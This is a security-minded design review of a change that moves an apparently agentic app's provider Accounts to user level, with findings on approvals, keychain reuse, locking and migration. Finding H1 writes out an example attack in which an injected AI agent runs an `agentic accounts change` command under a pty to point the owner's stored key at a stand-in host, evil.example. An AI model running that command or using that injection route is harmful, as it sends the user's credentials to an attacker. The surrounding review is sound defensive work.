# Rubric review: global (user-level) Accounts (2026-11-22)

Reviewer: rubric walker (read-only; independent of the author). Scope: the `git diff` of the spine in `agentic-manager-replan` (AD-7, AD-13, AD-15 widening kinds and the whole *Interim CLI Account edit* passage, AD-16, AD-17, AD-19, AD-31, AD-32, AD-35, AD-48, Structural Seed, Capability map R6, four Deferred rows, the last Open Questions entries), the memlog entries 193–208, the earlier question entry 190 ("From the reviewer gate 2026-11-22 (Key use)"), and the brownfield code (`crates/am-app/src/accounts.rs` module doc, `crates/am-config/src/account_edit.rs`, `crates/am-secrets/src/lib.rs`, `templates/samples/company-a/models/accounts.yaml`, the six `fixtures/projects/*/models/accounts.yaml`). Epic 2–5 and 9 `tickets.toml` were read for build order only.

## Verdict

**Revise (pass after fixes).** 1 critical, 3 high, 8 medium, 10 low.

Every brief item has text in the spine, the owner's verbatim words are quoted where they apply, and nothing outside the Accounts topic changed. The design itself (one user file written by am-config, its History and records in a user store, the same hash-plus-record *Key use* check ported unchanged, keychain naming unchanged) is sound and ratifies the brownfield as "the stage the new story replaces".

The critical finding is new to this change: a user-level Account is now shared by every project, but a project's approval binds only the Account **id**, so one user-level `change` (or a remove and re-add, or the same id on another Mac) silently moves every referencing project's seats, including seats with linked folders, to a new provider and host. That bypasses the per-project "moving a folder seat to a cloud model is widening" rule (AD-30, AD-15, AGENTS.md folder policy). The highs are an over-broad threat-model sentence that also removed a cheap guard against injected agents, a stale AD-16 sentence that contradicts AD-15, and AD-6's one-writer rule left unamended while the user store gets several writer processes.

## Input reconcile

### Owner's words (2026-11-22)

| Owner words | Landed? | Where / note |
|---|---|---|
| "global Accounts — one per provider key, reusable across projects" | Yes | AD-17 *User-level Accounts*, *List*, *References*; AD-31 |
| "user-level with globally unique ids that projects reference, rather than per-project copies" | Partly reinterpreted | AD-17 *Ids*: owner-chosen slugs unique **per macOS user / this Mac**, never minted. Defensible (templates must name ids), but "globally unique" became "unique on this Mac" without an owner question; see M6 |
| "changing an Account's provider or address as a widening change requiring re-confirmation, required before runs/Doctor send keys" | Yes | AD-15 widening kinds; *Change*; *Key use* ("before any run path from epic 2 story 6 or Doctor") |
| "path comparison … defer" | Yes | Deferred row; *Key use* says the path is not compared |
| "CLI confirmation of sample Accounts — defer" | Yes (made moot) | Deferred row; the sample ships no definitions |
| "same-user forged confirmation — accept and document as out of threat model" | Yes, but stated wider than the owner's words | AD-13 bold sentence; AD-15 *Key use*; see H1 |

### Earlier question entry (memlog 190)

| Item | Status in spine |
|---|---|
| (a) provider/base_url/key state change not a widening kind | Provider and base_url: closed. Key state: not classified and no re-confirmation path (L3) |
| (b) path not compared | Deferred (owner) |
| (c) sample Accounts have no record | Moot: sample ships none |
| (d) shared keychain entries across projects (adversarial C1) | Closed by one id = one definition = one record; but remove-then-re-add reuses an orphaned key (M3) |
| (e) owner-uid child forges file + History + audit | Accepted (AD-13) |
| (f) keyed loopback key to whoever holds the port | Still open, listed |
| (g) keyless loopback crawl-service | Still open, listed |
| Sofia: `agentic spike c1/c4` send `spike-anthropic` unchecked | **Not carried into the new entry** and now worse, since ids are user-wide (L2) |
| Sofia: 2.10, first run path, Doctor, 4.18, 5.5 carry the check | Carried in the new Sofia guidance |

### Brief items

| Brief item | Covered? |
|---|---|
| (1) Where the user list lives | Yes: `<app data dir>/accounts.yaml`, user store `user.db`, `user.lock` (AD-17, AD-32, Seed) |
| (1) How projects reference; what happens to `models/accounts.yaml` | Yes: `account: <id>`; validate error + `migrate` `ConfigMigration` (AD-17 *Old project files*, AD-15 *Migrate*) |
| (1) Id uniqueness | Yes, per Mac (M6) |
| (1) Confirmation record location, same rule | Yes: user store `account_added` / `account_removed`; *Key use* unchanged in shape |
| (1) Keychain naming, one key for every project | Yes: AD-17 unchanged naming |
| (1) Export/import carry references only | Yes: AD-17 *Export, import and backup* |
| (1) Templates and Company A sample naming | Yes, with a gap on present ids at apply (M7) and fixtures (M5) |
| (2) provider/base_url change = widening, before 2.6 / Doctor | Yes; but per-project effect not covered (C1) |
| (3) Deferred with date | Yes, four rows, dated |
| (4) Threat statement in AD-13 and AD-15 *Key use* | Yes, over-broad (H1) |
| (5) Sofia story-order guidance | Yes; insertion point should be pinned more exactly (L5) |

## Findings

### Critical

**C1. A user-level change retargets every project's seats, folder seats included, with no project-level confirmation.**
- *Location:* AD-15 widening kinds ("in a project, naming an Account its approved grant set does not list"), AD-15 *Change*, AD-16 approved grant set, AD-17 *References* and *Ids* ("a project moved to another Mac resolves by the same id"); against AD-30 *Leaving the machine* ("linking a folder to a cloud-model seat (or moving such a seat to a cloud model) is privilege-widening") and AGENTS.md ("never send a file to a cloud model without the two-step folder-link confirmation").
- *Problem:* A project's approval now binds an Account **id** only. Three paths change what that id points at without any project seeing a widening: (1) `agentic accounts change my-gw --base-url https://api.cloud.example` on a keyed `openai-compatible` Account that was `http://127.0.0.1:8080` (only keyless Accounts are blocked from going remote); (2) `remove` then `add` of the same id with another provider (remove's reference check covers reachable projects only); (3) a project moved to another Mac where the same id names another endpoint. In each, a seat with linked folders, confirmed when its model was local, starts sending files to a cloud host. The `change` sentence lists references only in reachable projects and does not say that folder files will leave the Mac. Projects on unmounted volumes get no notice. *Key use* passes, because the owner did confirm the **user-level** record, so nothing stops the call. Two units diverge: am-config's per-project classifier (AD-30's kind) and the user-level writer.
- *Fix text (AD-15 widening kinds, after the project-level kind):* "A project's approved grant set records, for each Account id it lists, the provider, scheme, host and port of the user-level `account_added` entry it was approved against, and whether that endpoint is loopback. A project load (startup or Reload, AD-16) and every run start compare these with the latest user-level record; a difference is a project-level widening, 'an Account this project names now goes to another provider or endpoint', held like any other until confirmed **in that project** with the two-step confirmation, whose sentence names each seat with linked folders whose files would now leave this Mac (AD-30). Until it is confirmed, runs of that project make no call to that Account and say why. Before epic 4 story 18 exists, `agentic accounts change` refuses a change from a loopback to a non-loopback endpoint, or to another host, while any project of the root index (reachable or not, by its last recorded config) names the Account, and says to remove the references first."
- Add to AD-17 *Ids:* "the same id on another Mac resolves only after that project confirms the endpoint it now names (AD-15)."

### High

**H1. AD-13's threat-model sentence is wider than the owner's acceptance, contradicts AD-13's own Prevents line, and removed a guard against injected agents.**
- *Location:* AD-13 Rule, last two sentences ("**Same-user processes are outside the threat model** … The rules above defend against web pages, other localhost services, the App-Sandboxed helpers, hand edits, sync tools, imports and agents."); AD-15 *Open* ("Because they write no project, the refusal of CLI decisions while a project enables a stdio MCP server or a Source with `render: true` does not apply to them"); AD-15 *Key use* ("defends against … agents").
- *Problem:* (1) The owner accepted "same-user **forged confirmation**". The new sentence makes **all** same-user processes out of scope. That contradicts AD-13's Prevents line ("a same-user child process (stdio MCP server, `agentic __extract`) acting as the owner") and the CLI-class narrowing that exists only because owner-uid children are in the threat model. (2) An agent with a shell-capable or exec-capable stdio MCP server **is** a same-user process. "Defends against agents" is therefore wrong whenever such a server is enabled. (3) The refusal dropped for `add`/`change`/`remove` was the cheap guard against exactly that: an injected model running `script -q /dev/null agentic accounts change openai --base-url https://evil.example` under a pty passes the terminal predicate, types the id, and redirects the owner's stored key. `change` reads no key, so the attacker never needs it. The macOS Keychain ACL otherwise stops a foreign process from reading the key directly, so this path is the attacker's easiest exfiltration route, and it needs no forged SQLite rows.
- *Fix text (AD-13):* replace the bold sentence with "**A forged Account confirmation record is outside the threat model** (owner 2026-11-22: 'same-user forged confirmation — accept …'): a process running as the owner (an owner-uid child or any other program) can write the user Accounts file, the user store and its audit rows together and so pass AD-15's *Key use* check; this is accepted, stated on the About page and in `docs/threat-model.md`. Every other rule above that names owner-uid children stays in force. An agent that can run a stdio MCP server with exec or file-write tools acts as such a process."
- *Fix text (AD-15 *Open*):* "`add`, `change` and `remove` are refused while any project of the root index enables a stdio MCP server or a Source with `render: true`, or while a running `agentic serve`/`service`/desktop process serves one (read from its run file), naming that project. `change`, and an `add` that would reuse an existing keychain entry, also require the stored key to be typed again (compared in memory, constant time) before anything is written." Keep "a forged record is accepted" as the only stated residual risk.

**H2. AD-16 still says the interim CLI Account edit updates an approved grant set, and it gives no baseline for classifying the user file.**
- *Location:* AD-16 Rule: "an apply never creates the first approved grant set (nor does AD-15's interim CLI Account edit, which updates an existing set by its own patch only; amended 2026-11-22)"; AD-16's Reload/startup comparison "compares the new snapshot's grant set with it".
- *Problem:* AD-15 deleted "The same transaction updates an existing approved grant set by this patch only". The user-level edit opens no project, so it cannot touch any project's grant set. A builder of 4.17 or 4.18 reading AD-16 builds the opposite. AD-16 also defines widening detection on Reload and startup against a project's grant set, but the user file has none. "When it adds an Account or changes one's provider or `base_url`" has no stated comparison baseline.
- *Fix text (AD-16):* replace the parenthesis with "(AD-15's interim CLI Account edit writes only the user Accounts file and never touches a project's grant set; amended 2026-11-22)". After the sentence about the user Accounts file's hash, add: "The user Accounts file has no grant set. Its baseline is the after-image of its latest History entry in the user store, and `is_widening` classifies an outside change of it against that image."

**H3. AD-6's one-writer rule is contradicted by the user store and was not amended.**
- *Location:* AD-6 Rule ("One writer task owns the only read-write connection"); AD-17 *List* ("(AD-6, AD-7: … one writer at a time); a command writing it holds `<app data dir>/user.lock` for that write only, so several processes … take turns").
- *Problem:* The user store has one read-write connection per process (two servers plus the CLI), serialised by a lock file. That is a different rule from AD-6's single owner of the only read-write connection. It weakens an earlier rule without saying so in AD-6. Nothing states how the hash-chain tip (AD-25), the intent rows and History stay consistent across processes (read under the lock, inside `BEGIN IMMEDIATE`).
- *Fix text (AD-6, append):* "The user store (AD-17) is the one exception (amended 2026-11-22, owner: global Accounts): each process holds at most one read-write connection to it, used only while holding `<app data dir>/user.lock`. Each write takes the lock, opens `BEGIN IMMEDIATE`, re-reads the audit chain tip, the latest History and any pending intent, commits, then releases the lock. Readers stay read-only."

### Medium

**M1. Which story's Reload accepts an outside change of the user file: 4.18 or 5.5?**
- *Location:* AD-15 *Later confirmations* ("epic 4 story 18's confirmed Reload of an outside change of the user file"); AD-15 *Open* ("until the owner reverts it (from story 5.5, the UI's Reload)"); AD-16 ("from epic 5 story 5 Reload applies it"); memlog 207 ("4.18 holds an outside change of the user file").
- *Fix:* choose one. Suggested text for all three places: "From epic 4 story 18 an outside change of the user file is held and reported (Doctor, banner) and its Reload is the two-step confirmation when it widens; epic 5 story 5 gives it the Account card."

**M2. Before Reload exists there is no recovery from an outside change of the user file.**
- *Location:* AD-15 *Open* and *Key use*; AD-16.
- *Problem:* Any byte change, even a comment or a name, fails the whole-file hash. Every keyed and keyless Account in every project then stops, and `add`/`change`/`remove` are refused "until the owner reverts it". History stores a diff, so the owner has nothing to restore from.
- *Fix text (AD-15 *Open*):* "The refusal names the file and says how to restore it: `agentic accounts list --confirmed` (read-only, any stdin) prints the bytes of the latest History after-image, which the owner copies back; no CLI command adopts an outside change."

**M3. An orphaned keychain entry is silently reused for a different provider or endpoint.**
- *Location:* AD-15 *Remove* ("leaves the keychain entry in place and says so"), *Add* ("An existing keychain entry for that id is reused, never overwritten"), *Migrate* (reuses the per-project entry).
- *Problem:* `remove openai`, then later `add openai --provider openai-compatible --base-url https://gw.example` sends the key confirmed for OpenAI to the gateway. The only warning is a generic "reused". The rationale for keeping the entry ("another project may use the same id") no longer holds at user level.
- *Fix text:* "*Remove* asks whether to delete the keychain entry, default Yes. When *Add* or *Migrate* would reuse an entry, its sentence names the provider and host of the last `account_added` for that id before its `account_removed`, if any. If the provider or host differs, the key must be typed again (H1), which replaces the entry."

**M4. `migrate` reaches a dead end before 5.5, and its two transactions have no stated order.**
- *Location:* AD-15 *Migrate*.
- *Problem:* (1) On an id conflict, the fix is "renaming references is a project config edit for the UI", but no UI exists before epic 5. The project keeps a validate error and cannot be used. (2) The adds commit in the user store and the file removal commits in the project store. Order, crash behaviour and lock order are unstated.
- *Fix text:* "`migrate --project <path> --as <old-id>=<new-id>` adds the conflicting entry under the new id and rewrites that project's references in the same `ConfigMigration` diff, shown before the typed confirmation. User-store adds commit first and the project `ConfigMigration` last. A re-run is idempotent (an entry already present with the same provider and endpoint needs nothing). Lock order is the project lock, then `user.lock`; nothing waits on a project lock while holding `user.lock`."

**M5. The fixtures rule leaves no way to test the old layout.**
- *Location:* AD-17 *Templates and fixtures* ("fixture project trees carry no `models/accounts.yaml` (`agentic validate --template` refuses one)").
- *Problem:* The validate-error test and the `migrate` trust tests need a project that still holds `models/accounts.yaml`. Today six `fixtures/projects/*` carry one.
- *Fix text:* "Except `fixtures/projects/legacy-accounts/`, which holds the pre-2026-11-22 layout, is excluded from `validate --template` and is expected to fail `agentic validate`. The six current fixture files move to `fixtures/accounts/<variant>.yaml`."

**M6. "Globally unique ids" was read as "unique on this Mac" without an owner question.**
- *Location:* AD-17 *Ids*; memlog 197.
- *Problem:* The reading is reasonable, but it changes the owner's words. Together with C1 it decides what a project moved between Macs resolves to.
- *Fix:* add to Open Questions: "(Owner, 2026-11-22) 'globally unique ids' is read as owner-chosen slugs unique per macOS user, so templates can name them. A project moved to another Mac resolves the id there only after confirming its endpoint (AD-15). Confirm, or choose minted ids."

**M7. Applying the shipped sample does not say what happens to ids already present on this Mac.**
- *Location:* AD-17 *Templates and fixtures* (only missing ids are named); AD-16 ("a project the app itself created from shipped templates, whose baseline is written at create"); memlog 206 ("existing ones are the project widening listed in the apply's confirmation").
- *Problem:* As written, 5.12/5.16 may baseline `openai` and `anthropic` into a new project's grant set silently, because shipped templates are exempt.
- *Fix text (AD-17):* "…and an id present on this Mac is listed in the apply's confirmation as the project-level widening (AD-15). The shipped-template exemption covers role capabilities only, never an Account reference."

**M8. User-store schema migration with several live processes is unspecified.**
- *Location:* AD-7 ("The user store (AD-17) migrates under the same rules"); AD-17.
- *Problem:* An app update can leave an older `agentic serve` running while a newer CLI migrates `user.db`. AD-7 only says the binary refuses a newer database at open.
- *Fix text (AD-7):* "The user store migrates only while holding `user.lock`. Each process checks the user store's schema version under the lock before every write and every *Key use* read, and refuses in words ('restart Agentic Manager') when it is newer than the process knows."

### Low

- **L1. Stale crate descriptions.** Design Paradigm table: "`am-config` (project files)". Seed: "`am-store/`" names no user store. *Fix:* "`am-config` (project files and the user Accounts file)"; add "user store" to the am-store comment.
- **L2. Open Questions are not fully reconciled.** Line 830 still states (a)–(e) as open, with no "(Resolved …)" mark. The new resolved entry drops the Sofia item on `agentic spike c1/c4` sending `spike-anthropic` with no check, which matters more now that ids are user-wide. *Fix:* append "(a)–(e) resolved 2026-11-22, below" to line 830. Add to AD-17 *Ids*: "ids starting `spike-` are reserved and refused by add and validate". Keep the spike item open for Sofia.
- **L3. Key state has no classification and no re-confirmation path.** `change` "keeps the key state", so keyless↔keyed needs remove + re-add, and remove is refused while references exist. *Fix:* state that `is_widening`'s exhaustive match covers the user file schema (`name` is not widening; setting `secret_ref` or a key is widening; clearing one is not). Add `agentic accounts change <id> --key` (typed id, key without echo) writing `account_added` with `key: stored`.
- **L4. The per-call check omits removal.** It checks only that "the latest `account_added` entry still names the destination". *Fix:* "… and no `account_removed` follows it."
- **L5. The Sofia guidance needs a precise insertion point.** In `epic-accounts-model-routing/tickets/tickets.toml` table order, 2.10 builds right after 2.3, so the new story goes between 3 and 10. Also name 2.5 (leak scan over the user store) and 2.11 (touches `test`), 9.11 (About page threat line), and story 2.2 now in flight (it must take endpoints through a port, never from `models/accounts.yaml`; AD-48). AGENTS.md has no `models/accounts.yaml` line, so "AGENTS.md lines … need a restatement" is inaccurate. It needs a new line instead: Accounts are user-level in the app data dir. *Fix:* reword item (1) and the last sentence accordingly.
- **L6. `RuntimeLayout` scope and test isolation.** AD-32 still says `RuntimeLayout` names every path inside the runtime folder, and the app data dir on Linux (AD-47 CI) is undefined. Tests must never resolve the real `~/Library/...`. *Fix (AD-32):* "`RuntimeLayout` also names the app data dir's paths, from a root am-app gives (`$XDG_DATA_HOME/agentic-manager/` off macOS; a temp dir in tests)."
- **L7. AD-25 names one chain.** *Fix:* "The user store keeps its own hash-chained `audit_log` (AD-17); Doctor verifies both chains; a project's audit export never includes user-store entries."
- **L8. Pre-migration backups of the user store have no stated encryption key.** AD-7 encrypts with a per-project key. *Fix:* "user-store pre-migration copies are not encrypted (they hold no key and no content) and are kept 0600", or name a user-level backup key.
- **L9. The window between another process's rename and its History commit causes a false refusal.** *Fix:* "a *Key use* read that sees a pending intent in the user store refuses in words as 'an Account change is being written; try again'."
- **L10. `agentic validate --template` and CI should not read the real user list.** *Fix:* "`--template` checks Account references for shape and reserved ids only and never resolves against the user list."
- (Also, outside the count) `migrate` treats "same provider, scheme, host and port" as identical and silently drops a differing `base_url` path. Name the difference in the sentence.

## Consistency checks (no finding)

- AD-12 egress, AD-48 pinned endpoint "read only from the user-level Account list": consistent.
- AD-13 sandbox: the user file and user store sit in the app data dir that the App-Sandboxed helpers are denied; AD-30 refuses linking the app data dir. Consistent.
- AD-31 reserved ids still skip the check; AD-35 table and test sentence amended; AD-19 per-process limiter, with its Deferred row bounded by provider 429s (a per-Account circuit breaker is also per process; worth one clause).
- Deferred rows: path comparison cannot diverge, because every accepted `base_url` change is a widening and a hand edit fails the hash. The sample-confirmation and cross-process limit rows let no two units disagree on a rule.
- Brownfield: the `am-secrets` `SERVICE = "agentic-manager"` / account `<account-id>` naming is unchanged, as stated. The am-app module-doc check order (stdio MCP/render refusal as check 4) is what H1 recommends keeping. The am-config `ACCOUNTS_FILE = "models/accounts.yaml"` becomes the legacy path that `migrate` reads.
